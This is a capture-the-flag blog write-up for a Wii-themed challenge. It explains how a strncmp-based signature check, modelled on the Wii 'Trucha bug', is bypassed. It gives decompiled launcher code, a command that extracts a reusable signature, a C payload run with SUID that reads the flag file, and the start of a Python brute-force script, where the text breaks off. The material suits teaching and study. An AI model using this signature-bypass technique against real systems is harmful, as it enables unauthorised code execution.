<!DOCTYPE html>
<html lang="en-us" dir="ltr">

<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']],
    displayMath: [['$$', '$$'], ['\\[', '\\]']],
  }
};
</script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>c0w5lip@wired:~$</title>

      <link rel="stylesheet" href="/css/main.min.edef4bfe9d5efcb07de08edced3ec4321d8e0a7c8f09550548edc1f9d8bb27d0.css" integrity="sha256-7e9L/p1e/LB94I7c7T7EMh2OCnyPCVUFSO3B&#43;di7J9A=" crossorigin="anonymous">


      <script src="/js/main.23cd0c7d837263b9eaeb96ee2d9ccfa2969daa3fa00fa1c1fe8701a9b87251a1.js" integrity="sha256-I80MfYNyY7nq65buLZzPopadqj&#43;gD6HB/ocBqbhyUaE=" crossorigin="anonymous"></script>


</head>
<body>
  <header>
    <h1>c0w5lip@wired:~$</h1>

  <nav>
    <ul>
  <span class="menu-bracket">[</span> 
  <ul style="list-style: none; padding: 0; margin: 0; display: inline-flex; align-items: center;">
      <li class="menu-item"> 
        <a href="/">home</a>
      </li>
      <li class="menu-item"> 
        <a aria-current="true" class="ancestor" href="/posts/">posts</a>
      </li>
      <li class="menu-item"> 
        <a href="/tags/">tags</a>
      </li>
      <li class="menu-item"> 
        <a href="/about/">about</a>
      </li>
  </ul>
  <span class="menu-bracket">]</span> 
    </ul>
  </nav>


  </header>
  <main>
    
      <div class="tags">
      üè∑Ô∏è
      
        <a href="/tags/write-up" class="tag">write-up</a>
      
        <a href="/tags/pwn" class="tag">pwn</a>
      
        <a href="/tags/crypto" class="tag">crypto</a>
      
      </div>
    
    
    
  
    <h1>Root-Xmas 2025: [pwn] Wii-nter hack</h1>
  

  

  <h2 id="information">Information</h2>
<p>Difficulty: Medium</p>
<p>Tags: pwn, crypto</p>
<p>Author: Drahoxx</p>
<p><img src="/images/2025-12-25-root-xmas/day7.gif" alt=""></p>
<blockquote>
<p>Mom! My Wii won&rsquo;t let me run custom games! It&rsquo;s 2008 already and this console is still locked down ‚Äî time to hack it.</p>
</blockquote>
<p>üìÇ <a href="/files/wii-nter_hack.zip">Files</a></p>
<h2 id="solution">Solution</h2>
<p>We&rsquo;re provided with a <code>launcher</code> and 3 games.</p>
<p>Here is some pseudocode for the <code>launcher</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_QWORD <span style="color:#81a1c1">*</span><span style="color:#81a1c1;font-weight:bold">__fastcall</span> <span style="color:#88c0d0">read_parse_and_check_file</span><span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">const</span> <span style="color:#81a1c1">char</span> <span style="color:#81a1c1">*</span>file<span style="color:#eceff4">,</span> _QWORD <span style="color:#81a1c1">*</span>start_ptr<span style="color:#eceff4">,</span> _QWORD <span style="color:#81a1c1">*</span>sig_ptr<span style="color:#eceff4">,</span> _QWORD <span style="color:#81a1c1">*</span>sig_idx<span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span><span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">char</span> <span style="color:#81a1c1">*</span>ptr<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+28h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1;font-weight:bold">__int64</span> size<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+30h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    FILE <span style="color:#81a1c1">*</span>stream<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>
</span></span><span style="display:flex;"><span>    stream <span style="color:#81a1c1">=</span> <span style="color:#88c0d0">fopen</span><span style="color:#eceff4">(</span>file<span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#34;rb&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#81a1c1">!</span>stream <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">perror</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] Failed to open signed file&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#88c0d0">fseek</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">,</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">2</span><span style="color:#eceff4">)</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">perror</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] fseek end&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    size <span style="color:#81a1c1">=</span> <span style="color:#88c0d0">ftell</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> size <span style="color:#81a1c1">&lt;</span> <span style="color:#b48ead">0</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">perror</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] ftell&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#88c0d0">rewind</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> size <span style="color:#81a1c1">&lt;=</span> <span style="color:#b48ead">256</span> <span style="color:#81a1c1">||</span> size <span style="color:#81a1c1">&gt;</span> <span style="color:#b48ead">0x100000</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fwrite</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] Invalid file size.</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">1u</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">0x1Bu</span><span style="color:#eceff4">,</span> stderr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    ptr <span style="color:#81a1c1">=</span> <span style="color:#88c0d0">malloc</span><span style="color:#eceff4">(</span>size<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#81a1c1">!</span>ptr <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fwrite</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] malloc failed</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">1u</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">0x16u</span><span style="color:#eceff4">,</span> stderr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#88c0d0">fread</span><span style="color:#eceff4">(</span>ptr<span style="color:#eceff4">,</span> <span style="color:#b48ead">1u</span><span style="color:#eceff4">,</span> size<span style="color:#eceff4">,</span> stream<span style="color:#eceff4">)</span> <span style="color:#81a1c1">!=</span> size <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">perror</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] fread&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">free</span><span style="color:#eceff4">(</span>ptr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#88c0d0">fclose</span><span style="color:#eceff4">(</span>stream<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">*</span>sig_idx <span style="color:#81a1c1">=</span> size <span style="color:#81a1c1">-</span> <span style="color:#b48ead">256</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">*</span>start_ptr <span style="color:#81a1c1">=</span> ptr<span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">*</span>sig_ptr <span style="color:#81a1c1">=</span> <span style="color:#81a1c1">&amp;</span>ptr<span style="color:#eceff4">[</span><span style="color:#81a1c1">*</span>sig_idx<span style="color:#eceff4">];</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">return</span> sig_ptr<span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#81a1c1">int</span> <span style="color:#81a1c1;font-weight:bold">__fastcall</span> <span style="color:#88c0d0">main</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">int</span> argc<span style="color:#eceff4">,</span> <span style="color:#81a1c1;font-weight:bold">const</span> <span style="color:#81a1c1">char</span> <span style="color:#81a1c1">**</span>argv<span style="color:#eceff4">,</span> <span style="color:#81a1c1;font-weight:bold">const</span> <span style="color:#81a1c1">char</span> <span style="color:#81a1c1">**</span>envp<span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span><span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">void</span> <span style="color:#81a1c1">*</span>ptr<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+18h] [rbp-68h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1">char</span> game_hash<span style="color:#eceff4">[</span><span style="color:#b48ead">40</span><span style="color:#eceff4">];</span> <span style="color:#616e87;font-style:italic">// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1;font-weight:bold">__int64</span> signature<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+48h] [rbp-38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1">void</span> <span style="color:#81a1c1">*</span>game_core<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+50h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1">size_t</span> game_size<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+58h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1">int</span> k<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+64h] [rbp-1Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1;font-weight:bold">__int64</span> e<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+68h] [rbp-18h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1;font-weight:bold">__int64</span> n<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+70h] [rbp-10h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>    <span style="color:#81a1c1;font-weight:bold">const</span> <span style="color:#81a1c1">char</span> <span style="color:#81a1c1">*</span>game_file_path<span style="color:#eceff4">;</span> <span style="color:#616e87;font-style:italic">// [rsp+78h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> argc <span style="color:#81a1c1">==</span> <span style="color:#b48ead">2</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        game_file_path <span style="color:#81a1c1">=</span> argv<span style="color:#eceff4">[</span><span style="color:#b48ead">1</span><span style="color:#eceff4">];</span>
</span></span><span style="display:flex;"><span>        n <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>        e <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">load_public_key_from_custom_section</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">&amp;</span>n<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>e<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>k<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        game_core <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>        signature <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">read_parse_and_check_file</span><span style="color:#eceff4">(</span>game_file_path<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>game_core<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>signature<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>game_size<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#81a1c1">!</span><span style="color:#88c0d0">SHA256</span><span style="color:#eceff4">(</span>game_core<span style="color:#eceff4">,</span> game_size<span style="color:#eceff4">,</span> game_hash<span style="color:#eceff4">)</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#88c0d0">fwrite</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[ERROR] SHA256 failed</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">1u</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">0x16u</span><span style="color:#eceff4">,</span> stderr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>        ptr <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">uncipher_signature_with_publickey</span><span style="color:#eceff4">(</span>signature<span style="color:#eceff4">,</span> n<span style="color:#eceff4">,</span> e<span style="color:#eceff4">,</span> k<span style="color:#eceff4">,</span> <span style="color:#81a1c1">&amp;</span>ptr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">show_hashes</span><span style="color:#eceff4">(</span>ptr <span style="color:#81a1c1">+</span> k <span style="color:#81a1c1">-</span> <span style="color:#b48ead">32</span><span style="color:#eceff4">,</span> game_hash<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span> <span style="color:#88c0d0">strncmp</span><span style="color:#eceff4">(</span>ptr <span style="color:#81a1c1">+</span> k <span style="color:#81a1c1">-</span> <span style="color:#b48ead">32</span><span style="color:#eceff4">,</span> game_hash<span style="color:#eceff4">,</span> <span style="color:#b48ead">0x20u</span><span style="color:#eceff4">)</span> <span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#88c0d0">fwrite</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[FATAL] Signature is INVALID (hash mismatch)</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">1u</span><span style="color:#eceff4">,</span> <span style="color:#b48ead">0x2Du</span><span style="color:#eceff4">,</span> stderr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#88c0d0">exit</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">1</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">puts</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[GOOD] Signature is VALID!&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">write_game_to_disk</span><span style="color:#eceff4">(</span>game_size<span style="color:#eceff4">,</span> game_core<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">launch_game</span><span style="color:#eceff4">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">free</span><span style="color:#eceff4">(</span>ptr<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">free</span><span style="color:#eceff4">(</span>game_core<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">return</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#88c0d0">fprintf</span><span style="color:#eceff4">(</span>stderr<span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#34;Usage: %s &lt;signed_game_file&gt;</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">,</span> <span style="color:#81a1c1">*</span>argv<span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">return</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
</span></span></code></pre></div><p>After some research, it becomes clear that this challenge is based upon an actual vulnerability that used to be present in <a href="https://wiibrew.org/wiki/IOS">IOS</a>: <a href="https://wiibrew.org/wiki/Signing_bug">The Trucha bug</a>.</p>
<p>This vulnerability has been leveraged in the past in order to install software that Nintendo didn&rsquo;t approve of on the Wii.</p>
<p>The core of the vulnerability exploits a flaw in the behaviour of the <code>strncmp()</code> function: the function returns prematurely whenever it encouters a null byte on <em>either</em> of the two strings its comparing (normally at the end). However, because we&rsquo;re not passing ASCII strings but binary hashes to the function, we can this behavior if either of two hashes compared (the signature hash and the <code>game_hash</code>) contains a null byte (<code>00</code>) at any position.</p>
<p>However, <code>strncmp</code> returns whenever it encounters a null byte (<code>00</code>) on <em>either</em> of the strings it compares, <strong>but</strong> it doesn&rsquo;t return <code>0</code> (strings are equal) unless the bytes it compared actually are the same, even if it returned prematurely.</p>
<p>To summarize:</p>
<ul>
<li>we need one of the two hashes to contain a null byte as early as possible</li>
<li>we need our two hashes to only be equal up until that position: we need to generate a <a href="https://en.wikipedia.org/wiki/Hash_collision">hash collision</a></li>
<li>that position could be as early as the first byte, in which case we don&rsquo;t actually need a hash collision but only the other hash to also start with a null byte</li>
</ul>
<p>If we pay attention to the signature that&rsquo;s printed for each game at the beginning of its execution, we&rsquo;ll notice one game stands out:</p>
<pre tabindex="0"><code>$ ./launcher games/super_smash_bros-brawl_rootme_arena
[i] Unciphering signature with public key (m = sig^e mod n).
[i] DECRYPTED HASH:
        00 59 DF 5E D5 96 49 B0
        F3 88 65 68 F4 0A 8F AF
        50 FF 4B 37 C9 D1 9C BB
        2D 84 24 03 5B 27 70 66



[i]COMPUTED HASH:
        00 59 DF 5E D5 96 49 B0
        F3 88 65 68 F4 0A 8F AF
        50 FF 4B 37 C9 D1 9C BB
        2D 84 24 03 5B 27 70 66



[GOOD] Signature is VALID!
...
</code></pre><p>The hash of the unciphered signature of the game <code>super_smash_bros-brawl_rootme_arena</code> starts with a null byte (<code>00</code>). The signature hash of the game therefore satisfies the property described earlier.</p>
<p>And because RSA is deterministic (obviously), the <code>[i] DECRYPTED HASH</code> would still be the same (i.e start with a null byte) if we reused the game&rsquo;s signature (i.e appended it to the end of another game).</p>
<p>Consider the following:</p>
<p><code>game file (e.g super_smash_bros-brawl_rootme_arena)</code> = <code>game core (i.e game code)</code> + <code>256 bytes game signature (e.g 00 59 DF ... 66)</code></p>
<p>For our exploit to work, we therefore need:</p>
<ul>
<li>a signature ($256$ last bytes of the game file) that, when unciphered, outputs a hash starting with <code>00</code></li>
<li>the SHA256 hash of the game core (i.e game file without the $256$ bytes signature at the end) to also start with <code>00</code></li>
</ul>
<p>Both hash will be compared against eachother, but the function will return right from the first byte because it&rsquo;s a null byte for both hashes (and because the said null bytes are equals, the function will return as if both hash are equals).</p>
<p>We&rsquo;ll then extract the signature using this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tail -c <span style="color:#b48ead">256</span> super_smash_bros-brawl_rootme_arena &gt; magic_sig.bin
</span></span></code></pre></div><p>The last step is to write a payload (serving as the game core), compile it, and append gibberish at the end until its hash also starts with a null byte. This requires bruteforce, but is extremely fast because of the high probability of generating a satisfying hash candidate. Finally, we&rsquo;ll append the null-byte-starting signature we extracted from the other game to the payload.</p>
<p>Note that the launcher already sets SUID for the game it runs.</p>
<p>Our payload can therefore be as simple as follows:
<code>evil_game.c</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">#include</span> <span style="color:#5e81ac;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#5e81ac;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">#include</span> <span style="color:#5e81ac;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#5e81ac;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">int</span> <span style="color:#88c0d0">main</span><span style="color:#eceff4">()</span> <span style="color:#eceff4">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#88c0d0">printf</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[*] Evil game executed</span><span style="color:#ebcb8b">\n</span><span style="color:#a3be8c">&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#88c0d0">system</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;cat /app/flag.txt&#34;</span><span style="color:#eceff4">);</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">return</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">;</span>
</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
</span></span></code></pre></div><p>Note: we could&rsquo;ve directly extracted the signature using Python.</p>
<p>Finally, here&rsquo;s a Python script to generate the game to be runned:</p>
<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">import</span> <span style="color:#8fbcbb">hashlib</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">with</span> <span style="color:#81a1c1">open</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;evil_game&#34;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#34;rb&#34;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">as</span> f<span style="color:#eceff4">:</span>
</span></span><span style="display:flex;"><span>    evil_game <span style="color:#81a1c1">=</span> f<span style="color:#81a1c1">.</span>read<span style="color:#eceff4">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">with</span> <span style="color:#81a1c1">open</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;magic_sig.bin&#34;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#34;rb&#34;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">as</span> f<span style="color:#eceff4">:</span>
</span></span><span style="display:flex;"><span>    signature <span style="color:#81a1c1">=</span> f<span style="color:#81a1c1">.</span>read<span style="color:#eceff4">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[*] Payload size: </span><span style="color:#a3be8c">{}</span><span style="color:#a3be8c"> bytes&#34;</span><span style="color:#81a1c1">.</span>format<span style="color:#eceff4">(</span><span style="color:#81a1c1">len</span><span style="color:#eceff4">(</span>evil_game<span style="color:#eceff4">)))</span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[*] Signature size: </span><span style="color:#a3be8c">{}</span><span style="color:#a3be8c"> bytes (Expected: 256)&#34;</span><span style="color:#81a1c1">.</span>format<span style="color:#eceff4">(</span><span style="color:#81a1c1">len</span><span style="color:#eceff4">(</span>signature<span style="color:#eceff4">)))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nonce <span style="color:#81a1c1">=</span> <span style="color:#b48ead">0</span>
